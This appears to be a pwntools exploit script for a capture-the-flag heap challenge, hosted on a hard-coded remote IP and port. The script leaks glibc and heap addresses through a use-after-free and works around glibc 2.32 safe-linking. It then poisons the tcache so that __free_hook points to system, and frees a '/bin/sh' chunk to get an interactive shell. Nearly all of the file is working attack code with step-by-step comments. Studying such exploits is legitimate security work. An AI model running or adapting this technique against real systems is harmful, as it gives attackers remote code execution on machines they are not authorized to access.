from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

#context.terminal = ['tmux', 'splitw', '-h']
#binaryname = "./encrypted"
#p=process("./encrypted")
p = remote("207.154.239.148", 1370)
#p=gdb.debug(binaryname, gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)

#OK, targeting exit_funcs, they are "encrypted" with a "key" that lives in TCB right next to the canary
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

#rol is just rotate left... x << n | x >> 64-n

# encrypt a function pointer
def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))



# Prepare for Mom's Spaghetti
malloc(0, 24)
malloc(1, 24)
malloc(2, 0x421)
malloc(3, 24)
edit(3, b"/bin/sh")

free(2)     # Put chunk 2 in unsortedbin
malloc(4, 0x430)    # Force a sort of unsortedbin to move chunk 2 to large bins
resp = view(2)
glibcLeak = readLeak(resp)

# Get encryption key
malloc(5, 24)
free(5)
resp2 = view(5)
heapLeak = readLeak(resp2)
key = heapLeak

base = glibcLeak - 1982448  # Calculate glibc base using large bins leak and offset

# Get freehook and system addresses for current run
elf = ELF("./libc.so.6")
freehookOffset = elf.sym["__free_hook"]
systemOffset = elf.sym["system"]
freehook = base + freehookOffset
system = base + systemOffset

# Mom's Spaghetti (tcache poisoning)
free(0)     # Push chunk 0 into tcache
free(1)     # Push chunk 1 into tcache
edit(1, p64(freehook ^ key))     # Change next val of chunk 1 to encrypted freehook addr
malloc(6, 24)   # Pop chunk 1 from tcache (so now = chunk 6)
malloc(7, 24)   # Pop freehook addr from tcache (so now = chunk 7)
edit(7, p64(system))    # Put system addr in freehook
free(3)     # Call freehook, which now has system("/bin/sh")
p.interactive()

